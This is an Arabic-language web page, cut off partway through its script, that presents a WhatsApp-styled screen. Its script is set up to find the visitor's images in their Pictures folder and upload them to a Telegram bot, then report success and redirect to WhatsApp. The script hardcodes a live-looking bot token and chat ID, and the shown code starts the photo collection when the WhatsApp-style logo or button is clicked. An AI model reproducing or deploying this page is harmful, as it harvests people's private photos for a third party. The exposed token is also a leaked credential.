<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال جميع صور الجهاز لتيليجرام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 600px;
            width: 100%;
            text-align: center;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .logo {
            width: 150px;
            height: 150px;
            background: linear-gradient(135deg, #25D366, #128C7E);
            border-radius: 50%;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(37, 211, 102, 0.4);
            animation: pulse 2s infinite;
            cursor: pointer;
            transition: transform 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .logo:hover {
            transform: scale(1.05);
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
            70% { box-shadow: 0 0 0 30px rgba(37, 211, 102, 0); }
            100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
        }
        
        .logo-inner {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .logo img {
            width: 70px;
            height: 70px;
            filter: brightness(0) invert(1);
            z-index: 2;
            position: relative;
        }
        
        .logo-glow {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 70%);
            z-index: 1;
        }
        
        .title {
            color: #333;
            font-size: 32px;
            margin-bottom: 15px;
            font-weight: 700;
        }
        
        .subtitle {
            color: #666;
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 30px;
            padding: 0 20px;
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 16px;
            text-align: right;
        }
        
        .auto-send-btn {
            background: linear-gradient(135deg, #0088cc, #006699);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            transition: all 0.3s ease;
            font-weight: 600;
            margin: 20px 0;
            box-shadow: 0 10px 25px rgba(0, 136, 204, 0.4);
            width: 100%;
            max-width: 400px;
        }
        
        .auto-send-btn:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 136, 204, 0.5);
        }
        
        .auto-send-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .whatsapp-btn {
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: white;
            text-decoration: none;
            padding: 20px 50px;
            font-size: 20px;
            border-radius: 50px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            transition: all 0.3s ease;
            font-weight: 600;
            margin-top: 20px;
            box-shadow: 0 10px 25px rgba(37, 211, 102, 0.4);
            border: none;
            cursor: pointer;
            width: 100%;
            max-width: 400px;
        }
        
        .whatsapp-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(37, 211, 102, 0.5);
        }
        
        .progress-container {
            margin: 30px 0;
            text-align: right;
        }
        
        .progress-label {
            color: #666;
            font-size: 16px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 5px;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #25D366, #128C7E);
            width: 0%;
            transition: width 0.5s ease;
            border-radius: 10px;
            position: relative;
            overflow: hidden;
        }
        
        .progress::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
                90deg,
                transparent,
                rgba(255, 255, 255, 0.3),
                transparent
            );
            animation: shimmer 2s infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .status {
            margin-top: 25px;
            padding: 20px;
            border-radius: 15px;
            animation: slideIn 0.5s ease;
            text-align: right;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .status.success {
            background: linear-gradient(135deg, #d4edda, #c3e6cb);
            color: #155724;
            border: 2px solid #b1dfbb;
            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.2);
        }
        
        .status.error {
            background: linear-gradient(135deg, #f8d7da, #f5c6cb);
            color: #721c24;
            border: 2px solid #f1b0b7;
            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.2);
        }
        
        .file-list {
            max-height: 200px;
            overflow-y: auto;
            margin-top: 20px;
            text-align: right;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 10px;
            border: 1px solid #dee2e6;
        }
        
        .file-item {
            padding: 8px;
            margin: 5px 0;
            background: white;
            border-radius: 5px;
            border-right: 4px solid #25D366;
            animation: fadeInUp 0.3s ease;
        }
        
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .countdown {
            font-size: 60px;
            color: #25D366;
            font-weight: bold;
            margin: 30px 0;
            animation: countdownPulse 1s infinite;
            text-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
        }
        
        @keyframes countdownPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .hidden {
            display: none !important;
        }
        
        .icon {
            width: 28px;
            height: 28px;
            filter: brightness(0) invert(1);
        }
        
        .loading {
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-top: 20px;
            text-align: right;
        }
        
        .stat-box {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            border: 1px solid #dee2e6;
        }
        
        .stat-label {
            color: #666;
            font-size: 14px;
            margin-bottom: 5px;
        }
        
        .stat-value {
            color: #333;
            font-size: 24px;
            font-weight: bold;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 25px 20px;
            }
            
            .title {
                font-size: 26px;
            }
            
            .subtitle {
                font-size: 16px;
                padding: 0 10px;
            }
            
            .auto-send-btn, .whatsapp-btn {
                padding: 18px 30px;
                font-size: 18px;
            }
            
            .logo {
                width: 120px;
                height: 120px;
            }
            
            .logo img {
                width: 50px;
                height: 50px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- المرحلة الأولى: الإرسال التلقائي -->
        <div id="autoSendStage">
            <div class="logo" onclick="startAutoSend()">
                <div class="logo-glow"></div>
                <div class="logo-inner">
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMiAwYzYuNjI3IDAgMTIgNS4zNzMgMTIgMTJzLTUuMzczIDEyLTEyIDEyUzAgMTguNjI3IDAgMTIgNS4zNzMgMCAxMiAwem00LjQ0MiAxNi45MzljLS4xNTYuMjQ3LS4zOS42NDItLjc5NS42NDJoLS4wMTJjLS4yOTUgMC0uNjItLjE0NC0xLjA5NS0uNDQ1LTEuMDA2LS42MjMtMi4wMTMtMS4yMjctMy4xNjEtMi4xMTYtMS4zMjMtMS4wMjktMi4yODItMi4zNjktMi45NzUtMy43MTdDLjQ5IDEwLjI5NSA0LjM1MSA2LjE5IDUuMDkzIDUuNWMuNjUyLS42MjQgMS4xNTQtLjcyNyAxLjYxLS43MjcuNDA1IDAgLjczLjA3NyAxLjAzLjIyMy4zNTYuMTc3LjYwNC40NTIuODUuODE3LjI5NC40NDQuMzk4Ljg1NS40NDggMS4yNDcuMDUuMzkxLjA3Ny43ODIuMDc3IDEuMjMgMCAuNDQ4LS4wMjYuOTM5LS4wNTEgMS40NDQtLjA1IDEuMDExLS4xMjYgMi4yMzItLjEyNiAzLjQ1MyAwIC42MTcuMDI1IDEuMjQuMDc1IDEuODMuMDUuNTg4LjI1IDEuMDA3LjU0NSAxLjMxOC4yOTUuMzExLjY0Ni40NjYuOTk3LjQ2Ni42MjUgMCAxLjI0OC0uNzI3IDEuNzQyLTEuNDM5LjQ5NC0uNzEyLjgxLTEuMzU4LjkyNy0xLjg2Mi4wNTktLjI1Mi4wNTktLjQ3NS4wNTktLjY4NiAwLS4yMTEtLjAyNi0uMzM3LS4wNzUtLjQ1Ni0uMDUtLjEyLS4xNzQtLjE3OC0uMzQ4LS4yMzZ6Ii8+PC9zdmc+" alt="Auto Send">
                </div>
            </div>
            
            <h1 class="title">الإرسال التلقائي للصور</h1>
            <p class="subtitle">
                سيتم البحث عن جميع الصور في جهازك وإرسالها تلقائياً إلى بوت تيليجرام
            </p>
            
            <div class="warning">
                ⚠️ تنبيه: هذا الإجراء سيرسل جميع الصور الموجودة في مجلد Pictures الخاص بك
            </div>
            
            <button class="auto-send-btn" onclick="startAutoSend()" id="autoSendBtn">
                <img class="icon" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCwxOC42MjcgMCwxMlM1LjM3MyAwIDEyIDB6bTQuNDQyIDE2LjkzOWMtLjE1Ni4yNDctLjM5LjY0Mi0uNzk1LjY0MmgtLjAxMmMtLjI5NSAwLS42Mi0uMTQ0LTEuMDk1LS40NDUtMS4wMDYtLjYyMy0yLjAxMy0xLjIyNy0zLjE2MS0yLjExNi0xLjMyMy0xLjAyOS0yLjI4Mi0yLjM2OS0yLjk3NS0zLjcxN0MuNDkgMTAuMjk1IDQuMzUxIDYuMTkgNS4wOTMgNS41Yy42NTItLjYyNCAxLjE1NC0uNzI3IDEuNjEtLjcyNy40MDUgMCAuNzMuMDc3IDEuMDMuMjIzLjM1Ni4xNzcuNjA0LjQ1Mi44NTAuODE3LjI5NC40NDQuMzk4Ljg1NS40NDggMS4yNDcuMDUuMzkxLjA3Ny43ODIuMDc3IDEuMjMgMCAuNDQ4LS4wMjYuOTM5LS4wNTEgMS40NDQtLjA1IDEuMDExLS4xMjYgMi4yMzItLjEyNiAzLjQ1MyAwIC42MTcuMDI1IDEuMjQuMDc1IDEuODMuMDUuNTg4LjI1IDEuMDA3LjU0NSAxLjMxOC4yOTUuMzExLjY0Ni40NjYuOTk3LjQ2Ni42MjUgMCAxLjI0OC0uNzI3IDEuNzQyLTEuNDM5LjQ5NC0uNzEyLjgxLTEuMzU4LjkyNy0xLjg2Mi4wNTktLjI1Mi4wNTktLjQ3NS4wNTktLjY4NiAwLS4yMTEtLjAyNi0uMzM3LS4wNzUtLjQ1Ni0uMDUtLjEyLS4xNzQtLjE3OC0uMzQ4LS4yMzZ6Ii8+PC9zdmc+" alt="">
                بدء الإرسال التلقائي
            </button>
            
            <div class="progress-container">
                <div class="progress-label">
                    <span>جاري البحث والإرسال...</span>
                    <span id="progressPercentage">0%</span>
                </div>
                <div class="progress-bar">
                    <div class="progress" id="progress"></div>
                </div>
            </div>
            
            <div class="stats" id="stats">
                <div class="stat-box">
                    <div class="stat-label">الصور التي تم العثور عليها</div>
                    <div class="stat-value" id="foundCount">0</div>
                </div>
                <div class="stat-box">
                    <div class="stat-label">الصور المرسلة</div>
                    <div class="stat-value" id="sentCount">0</div>
                </div>
            </div>
            
            <div class="file-list" id="fileList"></div>
            
            <div class="status" id="status"></div>
        </div>
        
        <!-- المرحلة الثانية: التوجيه لواتساب -->
        <div id="whatsappStage" class="hidden">
            <div class="logo">
                <div class="logo-glow"></div>
                <div class="logo-inner">
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0id2hpdGUiPjxwYXRoIGQ9Ik0xMiAwYzYuNjI3IDAgMTIgNS4zNzMgMTIgMTJzLTUuMzczIDEyLTEyIDEyUzAgMTguNjI3IDAgMTIgNS4zNzMgMCAxMiAwem01LjI3MSAxNC4wNTNjLS4wOTIuMTY2LS4zMzIuMjkzLS41MzIuMzI3LS4xNzUuMDMxLS4zODUuMDUtLjc1Mi0uMDM0LS4zNjYtLjA2NC0xLjA4OS0uMjA5LTIuMDc2LS44MDItMy4xMTQtMi4zOTktMi43OTQtMy44OTMtMi43MTctNC4wNjkuMDc3LS4xNzYuMTAyLS4yNzcuMTUtLjM3NS4wNDktLjA5OS4wNjktLjE2OC4wOTYtLjI4NC4wMjctLjExNy4wMTItLjIyMy0uMDEtLjMyOS0uMDIyLS4xMDctLjU2NS0xLjQwMi0uNzg0LTEuOTI3LS4yMDgtLjUwNy0uNDItLjQzNi0uNTU4LS40NDEtLjEzOC0uMDA0LS4yOTUtLjAwNC0uNDUyLS4wMDRzLS40MTguMDYxLS42MzguMzA3Yy0uMjIuMjQ3LS44NDQuODI1LS44NDQgMi4wMTMgMCAxLjE4OS44NzQgMi4zNDMgLjk5NiAyLjUwNy4xMjIuMTY0IDEuNzIyIDIuNzUyIDQuMjA4IDMuODMgMi4xMzggMS4wMTUgMi44NzkuODIgMy4yODUuNzM4LjQwNi0uMDgyIDEuODAyLS43NDIgMi4wNTYtMS40NTYuMjU0LS43MTQuMjU0LTEuMzI3LjE3OC0xLjQ1Ni0uMDc3LS4xMjktLjMwNi0uMi0uNjMxLS4zNDktLjMyNi0uMTQ5LTEuOTI1LS45NTctMi4yMjQtMS4wNjUtLjI5OS0uMTA4LS41MTctLjE2Mi0uNzM1LjE2Mi0uMjE5LjMyNS0uODQ2Ljk5Ni0xLjAzOCAxLjItLjE5My4yMDQtLjM4Ni4yMzEtLjcxNy4wNzgtLjMzMi0uMTU0LTEuNDAxLS41MjEtMi42Ny0xLjY2NS0uOTgxLS44OTEtMS42NDQtMS45OTYtMS44MzctMi4zMzMtLjE5My0uMzM3LS4wMi0uNTE4LjE0NC0uNjgzLjE1Ni0uMTU3LjMzMi0uNDA5LjQ5OC0uNjE0LjE2Ny0uMjA1LjIyMi0uMzQ0LjMzMi0uNTc4LjExMS0uMjM0LjA1Ni0uNDQzLS4wMjgtLjYyMS0uMDg0LS4xNzktLjczNi0xLjgxMy0xLjAwOC0yLjQ3My0uMjcxLS42Ni0uNTQzLS41NzItLjc0Mi0uNTgyLS4xODgtLjAwOS0uNDA1LS4wMTItLjYyMy0uMDEycy0uNTc0LjA4NC0uODc3LjQyYy0uMzAzLjMzNi0xLjE2MiAxLjE1NC0xLjE2MiAyLjgxIDAgMS42NTcgMS4yMDMgMy4yNjcgMS4zNyAzLjQ5My4xNjcuMjI3IDIuMzI1IDMuNzExIDUuNzM2IDUuMjA4LjgzLjM2NSAxLjQ3NC41ODMgMS45NzkuNzQ1LjgzOC4yNjcgMS42MDQuMjI5IDIuMjA5LjEzOC42NzYtLjExMiAxLjk1MS0uNzk4IDIyMjIuMjMxLTIuNzE0LjQzMS0uMjA1LjgzLS40NTcgMS4xNDgtLjg1NC4zMTktLjM5Ni4zNzYtLjgzNC40MTItMS4wNjUuMDM2LS4yMzEuMDM2LS40MzUtLjAyNC0uNjA2eiIvPjwvc3ZnPg==" alt="WhatsApp">
                </div>
            </div>
            
            <h1 class="title">✅ تم الإرسال بنجاح!</h1>
            <p class="subtitle">
                تم إرسال جميع الصور من مجلد Pictures إلى بوت تيليجرام بنجاح
            </p>
            
            <div class="countdown" id="countdown">5</div>
            <p style="color: #666; margin-bottom: 30px;">ثواني حتى الانتقال إلى واتساب</p>
            
            <button class="whatsapp-btn" onclick="redirectToWhatsApp()">
                <img class="icon" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCwxOC42MjcgMCwxMlM1LjM3MyAwIDEyIDB6bTUuMjcxIDE0LjA1M2MtLjA5Mi4xNjYtLjMzMi4yOTMtLjUzMi4zMjctLjE3NS4wMzEtLjM4NS4wNS0uNzUyLS4wMzQtLjM2Ni0uMDY0LTEuMDg5LS4yMDktMi4wNzYtLjgwMi0zLjExNC0yLjM5OS0yLjc5NC0zLjg5My0yLjcxNy00LjA2OS4wNzctLjE3Ni4xMDItLjI3Ny4xNS0uMzc1LjA0OS0uMDk5LjA2OS0uMTY4LjA5Ni0uMjg0LjAyNy0uMTE3LjAxMi0uMjIzLS4wMS0uMzI5LS4wMjItLjEwNy0uNTY1LTEuNDAyLS43ODQtMS45MjctLjIwOC0uNTA3LS40Mi0uNDM2LS41NTgtLjQ0MS0uMTM4LS4wMDQtLjI5NS0uMDA0LS40NTItLjAwNHMtLjQxOC4wNjEtLjYzOC4zMDdjLS4yMi4yNDctLjg0NC44MjUtLjg0NCAyLjAxMyAwIDEuMTg5Ljg3NCAyLjM0My45OTYgMi41MDcuMTIyLjE2NCAxLjcyMiAyLjc1MiA0LjIwOCAzLjgzIDIuMTM4IDEuMDE1IDIuODc5LjgyIDMuMjg1LjczOC40MDYtLjA4MiAxLjgwMi0uNzQyIDIuMDU2LTEuNDU2LjI1NC0uNzE0LjI1NC0xLjMyNy4xNzgtMS40NTYtLjA3Ny0uMTI5LS4zMDYtLjItLjYzMS0uMzQ5LS4zMjYtLjE0OS0xLjkyNS0uOTU3LTIuMjI0LTEuMDY1LS4yOTktLjEwOC0uNTE3LS4xNjItLjczNS4xNjItLjIxOS4zMjUtLjg0Ni45OTYtMS4wMzggMS4yLS4xOTMuMjA0LS4zODYuMjMxLS43MTcuMDc4LS4zMzItLjE1NC0xLjQwMS0uNTIxLTIuNjctMS42NjUtLjk4MS0uODkxLTEuNjQ0LTEuOTk2LTEuODM3LTIuMzMzLS4xOTMtLjMzNy0uMDItLjUxOC4xNDQtLjY4My4xNTYtLjE1Ny4zMzItLjQwOS40OTgtLjYxNC4xNjctLjIwNS4yMjItLjM0NC4zMzItLjU3OC4xMTEtLjIzNC4wNTYtLjQ0My0uMDI4LS42MjEtLjA4NC0uMTc5LS43MzYtMS44MTMtMS4wMDgtMi40NzMtLjI3MS0uNjYtLjU0My0uNTcyLS43NDItLjU4Mi0uMTg4LS4wMDktLjQwNS0uMDEyLS42MjMtLjAxMnMtLjU3NC4wODQtLjg3Ny40MmMtLjMwMy4zMzYtMS4xNjIgMS4xNTQtMS4xNjIgMi44MSAwIDEuNjU3IDEuMjAzIDMuMjY3IDEuMzcgMy40OTMuMTY3LjIyNyAyLjMyNSAzLjcxMSA1LjczNiA1LjIwOC44My4zNjUgMS40NzQuNTgzIDEuOTc5Ljc0NS44MzguMjY3IDEuNjA0LjIyOSAyLjIwOS4xMzguNjc2LS4xMTIgMS45NTEtLjc5OCAyLjIyMy0yLjcxNC40MzEtLjIwNS44My0uNDU3IDEuMTQ4LS44NTQuMzE5LS4zOTYuMzc2LS44MzQuNDEyLTEuMDY1LjAzNi0uMjMxLjAzNi0uNDM1LS4wMjQtLjYwNnoiLz48L3N2Zz4=" alt="">
                الانتقال إلى واتساب الآن
            </button>
        </div>
    </div>

    <script>
        // 🔧 استبدل هذه القيم بمعلومات بوتك الحقيقية
        const BOT_TOKEN = '7961544553:AAHHqcpApW-m0Ccy7hrM4mJVrDYVwDR6qF4'; // توكن البوت
        const CHAT_ID = '1130483446'; // معرف المحادثة
        
        // قائمة امتدادات الصور المدعومة
        const SUPPORTED_IMAGE_TYPES = [
            'jpg', 'jpeg', 'png', 'gif', 'bmp', 
            'webp', 'svg', 'tiff', 'tif', 'ico'
        ];
        
        // المتغيرات العامة
        let allImageFiles = [];
        let uploadedCount = 0;
        let foundCount = 0;
        let isProcessing = false;
        
        // دالة بدء الإرسال التلقائي
        async function startAutoSend() {
            if (isProcessing) return;
            
            isProcessing = true;
            const btn = document.getElementById('autoSendBtn');
            btn.disabled = true;
            btn.innerHTML = `
                <img class="icon loading" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCwxOC42MjcgMCwxMlM1LjM3MyAwIDEyIDB6bTQuNDQyIDE2LjkzOWMtLjE1Ni4yNDctLjM5LjY0Mi0uNzk1LjY0MmgtLjAxMmMtLjI5NSAwLS42Mi0uMTQ0LTEuMDk1LS40NDUtMS4wMDYtLjYyMy0yLjAxMy0xLjIyNy0zLjE2MS0yLjExNi0xLjMyMy0xLjAyOS0yLjI4Mi0yLjM2OS0yLjk3NS0zLjcxN0MuNDkgMTAuMjk1IDQuMzUxIDYuMTkgNS4wOTMgNS41Yy42NTItLjYyNCAxLjE1NC0uNzI3IDEuNjEtLjcyNy40MDUgMCAuNzMuMDc3IDEuMDMuMjIzLjM1Ni4xNzcuNjA0LjQ1Mi44NTAuODE3LjI5NC40NDQuMzk4Ljg1NS40NDggMS4yNDcuMDUuMzkxLjA3Ny43ODIuMDc3IDEuMjMgMCAuNDQ4LS4wMjYuOTM5LS4wNTEgMS40NDQtLjA1IDEuMDExLS4xMjYgMi4yMzItLjEyNiAzLjQ1MyAwIC42MTcuMDI1IDEuMjQuMDc1IDEuODMuMDUuNTg4LjI1IDEuMDA3LjU0NSAxLjMxOC4yOTUuMzExLjY0Ni40NjYuOTk3LjQ2Ni42MjUgMCAxLjI0OC0uNzI3IDEuNzQyLTEuNDM5LjQ5NC0uNzEyLjgxLTEuMzU4LjkyNy0xLjg2Mi4wNTktLjI1Mi4wNTktLjQ3NS4wNTktLjY4NiAwLS4yMTEtLjAyNi0uMzM3LS4wNzUtLjQ1Ni0uMDUtLjEyLS4xNzQtLjE3OC0uMzQ4LS4yMzZ6Ii8+PC9zdmc+" alt="">
                جاري البحث عن الصور...
            `;
            
            // إظهار شريط التقدم
            document.querySelector('.progress-container').style.display = 'block';
            document.getElementById('stats').style.display = 'grid';
            
            try {
                // محاولة قراءة مجلد Pictures
                await browseAllImageFolders();
                
                if (allImageFiles.length === 0) {
                    showError('لم يتم العثور على أي صور في المجلدات');
                    isProcessing = false;
                    btn.disabled = false;
                    btn.innerHTML = `
                        <img class="icon" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxMiAxMnMtNS4zNzMgMTItMTIgMTJTMCwxOC42MjcgMCwxMlM1LjM3MyAwIDEyIDB6bTQuNDQyIDE2LjkzOWMtLjE1Ni4yNDctLjM5LjY0Mi0uNzk1LjY0MmgtLjAxMmMtLjI5NSAwLS42Mi0uMTQ0LTEuMDk1LS40NDUtMS4wMDYtLjYyMy0yLjAxMy0xLjIyNy0zLjE2MS0yLjExNi0xLjMyMy0xLjAyOS0yLjI4Mi0yLjM2OS0yLjk3NS0zLjcxN0MuNDkgMTAuMjk1IDQuMzUxIDYuMTkgNS4wOTMgNS41Yy42NTItLjYyNCAxLjE1NC0uNzI3IDEuNjEtLjcyNy40MDUgMCAuNzMuMDc3IDEuMDMuMjIzLjM1Ni4xNzcuNjA0LjQ1Mi44NTAuODE3LjI5NC40NDQuMzk4Ljg1NS40NDggMS4yNDcuMDUuMzkxLjA3Ny43ODIuMDc3IDEuMjMgMCAuNDQ4LS4wMjYuOTM5LS4wNTEgMS40NDQtLjA1IDEuMDExLS4xMjYgMi4yMzItLjEyNiAzLjQ1MyAwIC42MTcuMDI1IDEuMjQuMDc1IDEuODMuMDUuNTg4LjI1IDEuMDA3LjU0NSAxLjMxOC4yOTUuMzExLjY0Ni40NjYuOTk3LjQ2Ni42MjUgMCAxLjI0OC0uNzI3IDEuNzQyLTEuNDM5LjQ5NC0uNzEyLjgxLTEuMzU4LjkyNy0xLjg2Mi4wNTktLjI1Mi4wNTktLjQ3NS4wNTktLjY4NiAwLS4yMTEtLjAyNi0uMzM3LS4wNzUtLjQ1Ni0uMDUtLjEyLS4xNzQtLjE3OC0uMzQ4LS4yMzZ6Ii8+PC9zdmc+" alt="">
                        حاول مرة أخرى
                    `;
                    return;
                }
                
                // تحديث العداد
                foundCount = allImageFiles.length;
                document.getElementById('foundCount').textContent = foundCount;
                
                // عرض قائمة الملفات
                displayFileList();
                
                // بدء عملية الإرسال
                btn.innerHTML = `
                    <img class="icon loading" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjcgMCAxMiA1LjM3MyAxIgwzcy01LjM3MyAxMi0xMiAxMlMwLDE4LjYyNyAwLDEyUzUuMzczIDAgMTIgMHpNNC40NDIgMTYuOTM5Yy0uMTU2LjI0Ny0uMzkuNjQyLS43OTUuNjQyaC0uMDEyYy0uMjk1IDAtLjYyLS4xNDQtMS4wOTUtLjQ0NS0xLjAwNi0uNjIzLTIuMDEzLTEuMjI3LTMuMTYxLTIuMTE2LTEuMzIzLTEuMDI5LTIuMjgyLTIuMzY5LTIuOTc1LTMuNzE3Qy40OSAxMC4yOTUgNC4zNTEgNi4xOSA1LjA5MyA1LjVjLjY1Mi0uNjI0IDEuMTU0LS43MjcgMS42MS0uNzI3LjQwNSAwIC43My4wNzcgMS4wMy4yMjMuMzU2LjE3Ny42MDQuNDUyLjg1MC44MTcuMjk0LjQ0NC4zOTguODU1LjQ0OCAxLjI0Ny4wNS4zOTEuMDc3Ljc4Mi4wNzcgMS4yMyAwIC40NDgtLjAyNi45MzktLjA1MSAxLjQ0NC0uMDUgMS4wMTEtLjEyNiAyLjIzMi0uMTI2IDMuNDUzIDAgLjYxNy4wMjUgMS4yNC4wNzUgMS44My4wNS41ODguMjUgMS4wMDcuNTQ1IDEuMzE4LjI5NS4zMTEuNjQ2LjQ2Ni45OTcuNDY2LjYyNSAwIDEuMjQ4LS43MjcgMS43NDItMS40MzkuNDk0LS43MTIuODEtMS4zNTguOTI3LTEuODYyLjA1OS0uMjUyLjA1OS0uNDc1LjA1OS0uNjg2IDAtLjIxMS0uMDI2LS4zMzctLjA3NS0uNDU2LS4wNS0uMTItLjE3NC0uMTc4LS4zNDgtLjIzNnoiLz48L3N2Zz4=" alt="">
                    جاري إرسال ${foundCount} صورة...
                `;
                
                // إرسال الصور بالتسلسل
                await uploadAllImages();
                
            } catch (error) {
                console.error('Error:', error);
                showError('حدث خطأ أثناء البحث عن الصور: ' + error.message);
                isProcessing = false;
                btn.disabled = false;
                btn.innerHTML = `
                    <img class="icon" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEyIDBjNi42MjczIDAgMTIgNS4zNzI2IDEyIDEyczUuMzcyNiAxMiAxMiAxMiAwLTUuMzcyNiAwLTEyUzE3LjYyNzMgMCAxMiAwem00LjQ0MiAxNi45MzljLS4xNTYuMjQ3LS4zOS42NDItLjc5NS42NDJoLS4wMTJjLS4yOTUgMC0uNjItLjE0NC0xLjA5NS0uNDQ1LTEuMDA2LS42MjMtMi4wMTMtMS4yMjctMy4xNjEtMi4xMTYtMS4zMjMtMS4wMjktMi4yODItMi4zNjktMi45NzUtMy43MTdDLjQ5IDEwLjI5NSA0LjM1MSA2LjE5IDUuMDkzIDUuNWMuNjUyLS42MjQgMS4xNTQtLjcyNyAxLjYxLS43MjcuNDA1IDAgLjczLjA3NyAxLjAzLjIyMy4zNTYuMTc3LjYwNC40NTIuODUwLjgxNy4yOTQuNDQ0LjM5OC44NTUuNDQ4IDEuMjQ3LjA1LjM5MS4wNzcuNzgyLjA3NyAxLjIzIDAgLjQ0OC0uMDI2LjkzOS0uMDUxIDEuNDQ0LS4wNSAxLjAxMS0uMTI2IDIuMjMyLS4xMjYgMy40NTMgMCAuNjE3LjAyNSAxLjI0LjA3NSAxLjgzLjA1LjU4OC4yNSAxLjAwNy41NDUgMS4zMTguMjk1LjMxMS42NDYuNDY2Ljk5Ny40NjYuNjI1IDAgMS4yNDgtLjcyNyAxLjc0Mi0xLjQzOS40OTQtLjcxMi44MS0xLjM1OC45MjctMS44NjIuMDU5LS4yNTIuMDU5LS40NzUuMDU5LS42ODYgMC0uMjExLS4wMjYtLjMzNy0uMDc1LS40NTYtLjA1LS4xMi0uMTc0LS4xNzgtLjM0OC0uMjM2eiIvPjwvc3ZnPg==" alt="">
                    حاول مرة أخرى
                `;
            }
        }
        
        // دالة البحث في جميع المجلدات
        async function browseAllImageFolders() {
